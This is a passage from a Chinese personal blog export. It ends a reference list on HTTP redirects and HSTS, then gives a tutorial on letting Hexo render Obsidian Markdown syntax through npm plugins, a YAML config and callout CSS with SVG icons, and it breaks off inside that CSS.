<li><a href="https://zhuanlan.zhihu.com/p/558171809#:~:text=%E5%93%AA%E4%BA%9B%E6%83%85%E5%86%B5%E9%9C%80%E8%A6%81%E5%81%9A301%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%9F%20%E7%BD%91%E9%A1%B5%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E6%97%B6%E5%B8%B8%E4%BC%9A%E9%81%87%E5%88%B0%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E7%9A%84%E8%B0%83%E6%95%B4%EF%BC%8C%E5%B0%86%E9%A1%B5%E9%9D%A2%E8%BD%AC%E7%A7%BB%E5%88%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E5%9C%B0%E5%9D%80%EF%BC%9B%E7%BD%91%E9%A1%B5%E6%89%A9%E5%B1%95%E5%90%8D%E7%9A%84%E6%94%B9%E5%8F%98%EF%BC%8C%E8%BF%99%E4%BA%9B%E5%8F%98%E5%8C%96%E9%83%BD%E4%BC%9A%E5%AF%BC%E8%87%B4%E7%BD%91%E9%A1%B5%E5%9C%B0%E5%9D%80%E5%8F%91%E7%94%9F%E6%94%B9%E5%8F%98%EF%BC%8C%E6%AD%A4%E6%97%B6%E7%94%A8%E6%88%B7%E6%94%B6%E8%97%8F%E5%A4%B9%E5%92%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%97%A7%E5%9C%B0%E5%9D%80%E6%98%AF%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B9%8B%E5%90%8E%E4%BC%9A%E5%87%BA%E7%8E%B0404%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%AF%BC%E8%87%B4%E7%BD%91%E7%AB%99%E6%B5%81%E9%87%8F%E7%9A%84%E6%8D%9F%E5%A4%B1%E3%80%82%20%E6%88%96%E8%80%85%E6%98%AF%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D%E8%B7%B3%E8%BD%AC%E8%87%B3%E5%90%8C%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E7%AB%99%E4%B8%BB%E7%AB%99%E7%82%B9%E5%9F%9F%E5%90%8D%E4%B8%BA%20www.conimi.com%20%EF%BC%8C%E8%80%8C%E8%BF%98%E6%9C%89%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%20www.nico.cc%20%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%AF%B9%E8%AF%A5%E5%9F%9F%E5%90%8D%E8%AE%BE%E7%BD%AE%E4%BA%86301%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%8C%E5%BD%93%E8%BE%93%E5%85%A5,www.nico.cc%20%E6%97%B6%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BD%AC%E8%87%B3%20www.conimi.com%20%E3%80%82%20%E4%B8%89.%20301%E9%87%8D%E5%AE%9A%E5%90%91%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%82%B9%EF%BC%9F%20%E6%9C%89%E5%88%A9%E4%BA%8E%E7%BD%91%E7%AB%99%E9%A6%96%E9%80%89%E5%9F%9F%E7%9A%84%E7%A1%AE%E5%AE%9A%EF%BC%8C%E5%AF%B9%E4%BA%8E%E5%90%8C%E4%B8%80%E8%B5%84%E6%BA%90%E9%A1%B5%E9%9D%A2%E5%A4%9A%E6%9D%A1%E8%B7%AF%E5%BE%84%E7%9A%84301%E9%87%8D%E5%AE%9A%E5%90%91%E6%9C%89%E5%8A%A9%E4%BA%8EURL%E6%9D%83%E9%87%8D%E7%9A%84%E9%9B%86%E4%B8%AD%E3%80%82">什么是 301 和 302 重定向，都有哪些用途？ - 知乎 (zhihu.com)</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1762070">搞懂 HTTP 重定向 - 如何优雅地使用 301-腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/151764515">HTTP 和 HTTPS 有什么区别？ - 知乎 (zhihu.com)</a></li>
<li><a href="https://cloud.tencent.com/document/product/228/43827">内容分发网络 CDN 新手指引-文档中心-腾讯云 (tencent.com)</a></li>
<li><a href="https://xinshouzhanzhang.com/hsts.html">HSTS 详解原理及配置 HTTP 到 HTTPS 再到 HSTS - 新手站长网 (xinshouzhanzhang.com)</a></li>
<li><a href="https://segmentfault.com/a/1190000019745269">清除 chrome 的 HSTS 307 缓存 - 前端小记 - SegmentFault 思否</a></li>
<li><a href="https://cloud.tencent.com/developer/article/2301990">如何在 Nginx 中启用 HSTS？-腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1852437">Nginx 环境开启 ssl 后强制 https 301 全部指向 www 的方法-腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="107080905">
                            <a href="#107080905">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Nginx 的安装与反向代理配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>可参考这篇文章：<a href="#107080905" title="Nginx 的安装与反向代理配置" class="record-link highlight">Nginx 的安装与反向代理配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1867823418">
                            <a href="#1867823418">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 服务器 HTTPS 的配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>301 重定向以及 HSTS 等进阶配置：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link highlight">博客域名解析管理与网站 CDN 加速域名配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2966071784">
                            <a href="#2966071784">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>server、sqlite 朋友圈部署方案</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^cdn]: 参见我的折腾过程：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link highlight">博客域名解析管理与网站 CDN 加速域名配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2346883624">
                            <a href="#2346883624">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_社会生活);">⬤</span>
                                    
                                </span>
                                
                                <span>成为一名个人博客网站站长</span>
                                
                                <div class="record-links-context hover">
                                    <p>精华文章：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link highlight">博客域名解析管理与网站 CDN 加速域名配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3569112562" class="record">
            <header>
                <h1 class="record-title">Hexo 博客适配 Obsidian 新语法</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Obsidian');">Obsidian</button>
                    
                    <button class="btn" onclick="activeTag('Markdown');">Markdown</button>
                    
                    <button class="btn" onclick="activeTag('NPM');">NPM</button>
                    
                    <button class="btn" onclick="activeTag('Node.js');">Node.js</button>
                    
                    <button class="btn" onclick="activeTag('cmd');">cmd</button>
                    
                    <button class="btn" onclick="activeTag('CSS');">CSS</button>
                    
                    <button class="btn" onclick="activeTag('Hexo');">Hexo</button>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                    <button class="btn" onclick="activeTag('GFM');">GFM</button>
                    
                    <button class="btn" onclick="activeTag('OFM');">OFM</button>
                    
                    <button class="btn" onclick="activeTag('plugin');">plugin</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/1/2023</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>d4bc55f2</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/hexoobsidian-Grammar.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>本文介绍了使用插件使得 Hexo 接受部分 OFM 语法的方法</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>为了写这篇文章我手撸两个插件😭。还请各位小星星⭐支持一下~~</p>
</blockquote>
<h1>OFM</h1>
<p>Obsidian 除了支持大部分 CommonMark 语法、部分 GFM 功能以及 LaTeX 外，Obsidian 增加了一些新语法 [^新语法]。</p>
<p>[^新语法]: <a href="https://help.obsidian.md/Editing+and+formatting/Obsidian+Flavored+Markdown">Obsidian Flavored Markdown - Obsidian Help</a></p>
<table>
<thead>
<tr>
<th style="text-align:center">Syntax</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>[[ ]]</strong></td>
<td><a href="https://help.obsidian.md/Linking+notes+and+files/Internal+links">Internal links</a></td>
</tr>
<tr>
<td style="text-align:center"><strong>![[ ]]</strong></td>
<td><a href="https://help.obsidian.md/Linking+notes+and+files/Embedding+files">Embedding files</a></td>
</tr>
<tr>
<td style="text-align:center"><strong>![ name | width x height ]()</strong></td>
<td><a href="https://help.obsidian.md/Editing+and+formatting/Basic+formatting+syntax#External+images">External images</a> with dimensions</td>
</tr>
<tr>
<td style="text-align:center"><code>%%</code></td>
<td><a href="https://help.obsidian.md/Editing+and+formatting/Basic+formatting+syntax#Comments">Comments</a></td>
</tr>
<tr>
<td style="text-align:center"><code>&gt; [!note]</code></td>
<td><a href="https://help.obsidian.md/Editing+and+formatting/Callouts">Callouts</a></td>
</tr>
</tbody>
</table>
<blockquote>
<p>[!warning] Obsidian 不支持在 HTML 块中使用 Markdown 语法或空行。</p>
</blockquote>
<p>为了使得这些 Obsidian 语法在 Hexo 中产生作用，我们可以安装插件改进这一点，从而得到更丰富的书写体验。</p>
<blockquote>
<p>[!tip] 使用增强的 Markdown 语法会增加你对特定软件和插件的依赖性，但能提升你的写作体验。在进行相关配置时请酌情考虑。</p>
</blockquote>
<p>介绍解决方案前先简要说明一下我对 Markdown 渲染相关的插件的理解。</p>
<h1>Hexo 里的 Markdown 渲染引擎</h1>
<p>有了 Markdown 渲染引擎，Hexo 才能将 Markdown 格式的内容渲染成 HTML 网页。不同的渲染器支持的语法不同。这里列出以下三种渲染引擎。</p>
<table>
<thead>
<tr>
<th style="text-align:center">渲染引擎</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="https://www.npmjs.com/package/hexo-renderer-marked">hexo-renderer-marked</a></td>
<td>Hexo 预装渲染引擎。不支持复杂的数学公式</td>
</tr>
<tr>
<td style="text-align:center"><a href="https://www.npmjs.com/package/hexo-renderer-markdown-it">hexo-renderer-markdown-it</a></td>
<td>取代第一个的渲染器，渲染更快，更符合 CommonMark 规则</td>
</tr>
<tr>
<td style="text-align:center"><a href="https://github.com/CHENXCHEN/hexo-renderer-markdown-it-plus">hexo-renderer-markdown-it-plus</a></td>
<td>上一个渲染器的分支，可能更好用了吧</td>
</tr>
</tbody>
</table>
<p>上面的渲染引擎中内置不同的插件。我使用的 <code>hexo-renderer-markdown-it-plus</code> 支持扩展，我们可以在 npm 插件市场选择一款插件用以扩展更多语法（一般名为 markdown-it-xxxx）。</p>
<p>比如我安装的支持任务列表语法（GFM[^gfm]）的插件 <a href="https://www.npmjs.com/package/markdown-it-task-lists">markdown-it-task-lists</a>，以及后文讲到的 Callouts 语法（OFM）插件 <a href="https://github.com/widcardw/mdit-plugin-callouts#readme">mdit-plugin-callouts</a>。然后配置上去即可（后面有教程）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230801211426.png" alt="image.png|376"></p>
<p>[^gfm]: Markdown 相关语法规范详见 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></p>
<h1>Internal links 双向链接渲染解决方案</h1>
<p>只需安装一个插件（我本人写的哦！）就可以解决：</p>
<pre><code class="language-sh">npm install hexo-filter-titlebased-link --save
</code></pre>
<p>使用插件前确保所有标题都是独一无二的。</p>
<p><a href="https://github.com/uuanqin/hexo-filter-titlebased-link"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=hexo-filter-titlebased-link" alt="Readme Card"></a></p>
<p>GitHub 仓库地址：<a href="https://github.com/uuanqin/hexo-filter-titlebased-link">uuanqin/hexo-filter-titlebased-link: Transfer wiki links (based on the title) in Markdown files to permalink. 将基于标题的双向链接转换为 Hexo 设定的永久链接。 (github.com)</a></p>
<blockquote>
<p>喜欢的话赏个⭐~</p>
</blockquote>
<p>旧方案仍然可以工作，不过操作繁琐。详见：<a href="#2136059777" title="Obsidian Internal links 双向链接渲染解决方案" class="record-link ">Obsidian Internal links 双向链接渲染解决方案</a></p>
<p>渲染效果详见本站的测试页：<a href="#1982369523" title="双链渲染测试" class="record-link ">双链渲染测试</a></p>
<h1>Callouts 标注块</h1>
<blockquote>
<p>找了半天终于找到这个宝藏插件，这里默默感谢作者 <a href="https://widcard.win/">@widcardw</a>。现在 <a href="https://widcard.win/">@widcardw</a> 已经是本站友链用户啦~欢迎大家多多拜访！</p>
</blockquote>
<blockquote>
<p>此章节于 <code>240802</code> 改进（刚好文章发布一周年），相比原方案减少了操作步骤。</p>
</blockquote>
<p>对于这种需要另外渲染的新语法，我使用一款 npm 插件：<a href="https://www.npmjs.com/package/mdit-plugin-callouts">mdit-plugin-callouts - npm (npmjs.com)</a>，来增强渲染这一部分的内容。</p>
<p>这款插件本身是用于使 vite 博客网站支持 Obsidian 的 Callouts 用的，但稍微调整下也可以运用于 Hexo。</p>
<p>首先打开项目文件夹安装插件：</p>
<pre><code class="language-sh">npm install mdit-plugin-callouts
</code></pre>
<p>Hexo 博客中我安装的渲染器是 <code>hexo-renderer-markdown-it-plus</code>，它可以通过配置文件拓展其他 Markdown 渲染插件。</p>
<p>在 <code>_config.yml</code> 中增加相应配置以添加插件：</p>
<pre><code class="language-yaml"># markdown_it_plus 语法渲染插件选项
markdown_it_plus:
    plugins:
        # Obsidian Callouts
        - plugin:
            name: mdit-plugin-callouts
            enable: true
            options:
                # this is plugin option
</code></pre>
<p>新建外部 CSS 文件 <code>callout_blocks.css</code>，比如我放在博客 <code>source/css</code> 目录下，内容为：</p>
<pre><code class="language-css">:root {
    --un-ring-offset-shadow: 0 0 transparent;
    --un-ring-shadow: 0 0 transparent
}

.custom-callout {
    border-left: 3px solid;
    border-radius: var(--callout-radius);
    box-shadow: var(--un-ring-offset-shadow), var(--un-ring-shadow), var(--un-shadow);
    margin: 1rem 0;
    padding: 0 !important;
}

:root {
    --callout-note: 68, 138, 255;
    --callout-abstract: 0, 176, 255;
    --callout-info: 0, 184, 212;
    --callout-tip: 0, 191, 165;
    --callout-success: 8, 185, 78;
    --callout-question: 224, 172, 0;
    --callout-warning: 255, 145, 0;
    --callout-failure: 255, 82, 82;
    --callout-danger: 255, 23, 68;
    --callout-bug: 245, 0, 87;
    --callout-example: 124, 77, 255;
    --callout-quote: 158, 158, 158;
    --callout-radius: 0px;
    --callout-border-opacity: 0.5;
    --callout-title-bg-opacity: 0.08
}

.callout-fold:before {
    align-self: center;
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;16&quot; height=&quot;16&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;gray&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;chevron-down&quot;&gt;&lt;path d=&quot;m6 9 6 6 6-6&quot;/&gt;&lt;/svg&gt;')
}

.callout-fold {
    display: flex;
    transform: rotate(-90deg);
    transition: .5s cubic-bezier(.075, .82, .165, 1)
}

.custom-callout[open] &gt; summary &gt; .callout-fold {
    transform: rotate(0deg)
}

.custom-callout &gt; summary {
    border-top-left-radius: var(--callout-radius);
    border-top-right-radius: var(--callout-radius);
    cursor: pointer;
    margin: 0;
    padding: 1rem
}

.custom-callout &gt; summary::marker {
    content: &quot;&quot;
}

.custom-callout &gt; summary:before {
    margin-right: .5rem
}

.custom-callout &gt; summary::-webkit-details-marker {
    display: none
}

.callout-title {
    display: flex;
    justify-content: space-between
}

.custom-callout &gt; .callout-body {
    background: transparent !important;
    border-left: none;
    margin: 0 !important;
    padding: .5rem 1rem;
    position: relative
}

.custom-callout &gt; .callout-body &gt; p {
    margin: 8px 0
}

.custom-callout &gt; .callout-body &gt; pre {
    margin: 1.25rem -1rem
}

.custom-callout &gt; .callout-body &gt; pre:first-child {
    margin-top: -.75rem
}

.custom-callout &gt; .callout-body &gt; pre:last-child {
    margin-bottom: -.75rem
}

.custom-callout.note, .custom-callout.seealso {
    border-color: rgba(var(--callout-note), var(--callout-border-opacity))
}

.custom-callout.note &gt; summary, .custom-callout.seealso &gt; summary {
    background-color: rgba(var(--callout-note), var(--callout-title-bg-opacity))
}

.custom-callout.abstract, .custom-callout.summary, .custom-callout.tldr {
    border-color: rgba(var(--callout-abstract), var(--callout-border-opacity))
}

.custom-callout.abstract &gt; summary, .custom-callout.summary &gt; summary, .custom-callout.tldr &gt; summary {
    background-color: rgba(var(--callout-abstract), var(--callout-title-bg-opacity))
}

.custom-callout.info, .custom-callout.todo {
    border-color: rgba(var(--callout-info), var(--callout-border-opacity))
}

.custom-callout.info &gt; summary, .custom-callout.todo &gt; summary {
    background-color: rgba(var(--callout-info), var(--callout-title-bg-opacity))
}

.custom-callout.hint, .custom-callout.important, .custom-callout.tip {
    border-color: rgba(var(--callout-tip), var(--callout-border-opacity))
}

.custom-callout.hint &gt; summary, .custom-callout.important &gt; summary, .custom-callout.tip &gt; summary {
    background-color: rgba(var(--callout-tip), var(--callout-title-bg-opacity))
}

.custom-callout.check, .custom-callout.done, .custom-callout.success {
    border-color: rgba(var(--callout-success), var(--callout-border-opacity))
}

.custom-callout.check &gt; summary, .custom-callout.done &gt; summary, .custom-callout.success &gt; summary {
    background-color: rgba(var(--callout-success), var(--callout-title-bg-opacity))
}

.custom-callout.faq, .custom-callout.help, .custom-callout.question {
    border-color: rgba(var(--callout-question), var(--callout-border-opacity))
}

.custom-callout.faq &gt; summary, .custom-callout.help &gt; summary, .custom-callout.question &gt; summary {
    background-color: rgba(var(--callout-question), var(--callout-title-bg-opacity))
}

.custom-callout.attention, .custom-callout.caution, .custom-callout.warning {
    border-color: rgba(var(--callout-warning), var(--callout-border-opacity))
}

.custom-callout.attention &gt; summary, .custom-callout.caution &gt; summary, .custom-callout.warning &gt; summary {
    background-color: rgba(var(--callout-warning), var(--callout-title-bg-opacity))
}

.custom-callout.fail, .custom-callout.failure, .custom-callout.missing {
    border-color: rgba(var(--callout-failure), var(--callout-border-opacity))
}

.custom-callout.fail &gt; summary, .custom-callout.failure &gt; summary, .custom-callout.missing &gt; summary {
    background-color: rgba(var(--callout-failure), var(--callout-title-bg-opacity))
}

.custom-callout.danger, .custom-callout.error {
    border-color: rgba(var(--callout-danger), var(--callout-border-opacity))
}

.custom-callout.danger &gt; summary, .custom-callout.error &gt; summary {
    background-color: rgba(var(--callout-danger), var(--callout-title-bg-opacity))
}

.custom-callout.bug {
    border-color: rgba(var(--callout-bug), var(--callout-border-opacity))
}

.custom-callout.bug &gt; summary {
    background-color: rgba(var(--callout-bug), var(--callout-title-bg-opacity))
}

.custom-callout.example {
    border-color: rgba(var(--callout-example), var(--callout-border-opacity))
}

.custom-callout.example &gt; summary {
    background-color: rgba(var(--callout-example), var(--callout-title-bg-opacity))
}

.custom-callout.cite, .custom-callout.quote {
    border-color: rgba(var(--callout-quote), var(--callout-border-opacity))
}

.custom-callout.cite &gt; summary, .custom-callout.quote &gt; summary {
    background-color: rgba(var(--callout-quote), var(--callout-title-bg-opacity))
}

.callout-title &gt; .callout-icon + div {
    -webkit-box-flex: 1;
    -ms-flex: 1 1 0%;
    -webkit-flex: 1 1 0%;
    flex: 1 1 0%;
    margin-left: .25rem
}

.callout-icon {
    align-items: center;
    color: #000;
    display: flex
}

.callout-icon:before {
    height: 20px;
    width: 20px
}

.custom-callout.attention &gt; .callout-title &gt; .callout-icon:before, .custom-callout.caution &gt; .callout-title &gt; .callout-icon:before, .custom-callout.warning &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%23FF9100&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-alert-triangle&quot;&gt;&lt;path d=&quot;m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3ZM12 9v4M12 17h.01&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.note &gt; .callout-title &gt; .callout-icon:before, .custom-callout.seealso &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%23448AFF&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-pencil&quot;&gt;&lt;path d=&quot;m18 2 4 4M7.5 20.5 19 9l-4-4L3.5 16.5 2 22z&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.abstract &gt; .callout-title &gt; .callout-icon:before, .custom-callout.summary &gt; .callout-title &gt; .callout-icon:before, .custom-callout.tldr &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%2300B0FF&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-clipboard-list&quot;&gt;&lt;rect x=&quot;8&quot; y=&quot;2&quot; width=&quot;8&quot; height=&quot;4&quot; rx=&quot;1&quot; ry=&quot;1&quot;/&gt;&lt;path d=&quot;M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2M12 11h4M12 16h4M8 11h.01M8 16h.01&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.info &gt; .callout-title &gt; .callout-icon:before, .custom-callout.todo &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%2300B8D4&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-check-circle-2&quot;&gt;&lt;path d=&quot;M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z&quot;/&gt;&lt;path d=&quot;m9 12 2 2 4-4&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.hint &gt; .callout-title &gt; .callout-icon:before, .custom-callout.important &gt; .callout-title &gt; .callout-icon:before, .custom-callout.tip &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%2300BFA5&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-flame&quot;&gt;&lt;path d=&quot;M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.check &gt; .callout-title &gt; .callout-icon:before, .custom-callout.done &gt; .callout-title &gt; .callout-icon:before, .custom-callout.success &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%2300C853&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-check&quot;&gt;&lt;path d=&quot;M20 6 9 17l-5-5&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.faq &gt; .callout-title &gt; .callout-icon:before, .custom-callout.help &gt; .callout-title &gt; .callout-icon:before, .custom-callout.question &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%23E0AC00&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-help-circle&quot;&gt;&lt;circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;10&quot;/&gt;&lt;path d=&quot;M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3M12 17h.01&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.fail &gt; .callout-title &gt; .callout-icon:before, .custom-callout.failure &gt; .callout-title &gt; .callout-icon:before, .custom-callout.missing &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%23FF5252&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-x&quot;&gt;&lt;path d=&quot;M18 6 6 18M6 6l12 12&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.danger &gt; .callout-title &gt; .callout-icon:before, .custom-callout.error &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%23FF1744&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-zap&quot;&gt;&lt;path d=&quot;M13 2 3 14h9l-1 8 10-12h-9l1-8z&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.bug &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%23F50057&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-bug&quot;&gt;&lt;rect x=&quot;8&quot; y=&quot;6&quot; width=&quot;8&quot; height=&quot;14&quot; rx=&quot;4&quot;/&gt;&lt;path d=&quot;m19 7-3 2M5 7l3 2M19 19l-3-2M5 19l3-2M20 13h-4M4 13h4M10 4l1 2M14 4l-1 2&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout.example &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%237C4DFF&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-list&quot;&gt;&lt;path d=&quot;M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01&quot;/&gt;&lt;/svg&gt;')
}

